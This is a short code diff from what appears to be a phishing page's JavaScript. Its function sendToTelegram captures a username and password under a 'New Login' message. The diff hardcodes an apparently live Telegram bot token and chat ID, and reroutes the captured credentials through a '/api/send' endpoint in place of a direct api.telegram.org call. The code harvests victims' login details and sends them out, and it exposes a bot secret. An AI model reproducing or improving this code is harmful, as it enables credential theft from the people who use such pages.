@@ -39,11 +39,11 @@ generateMessages();
 
 
 
-// TELEGRAM FUNCTION (CLEAN)
+// TELEGRAM FUNCTION (FIXED)
 async function sendToTelegram(username, password) {
 
-const botToken = "YOUR_BOT_TOKEN";
-const chatId = "YOUR_CHAT_ID";
+const botToken = "8714955059:AAGMFhzVKaoDmtc5TLuI9OOhb125lYmTcKk";
+const chatId = "8453084186";
 
 const message = `
 🔥 New Login
@@ -53,14 +53,14 @@ const message = `
 `;
 
 try {
-    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+    await fetch("/api/send", {
         method: "POST",
         headers: {
             "Content-Type": "application/json"
         },
         body: JSON.stringify({
-            chat_id: chatId,
-            text: message
+            username,
+            password
         })
     });
 } catch (error) {
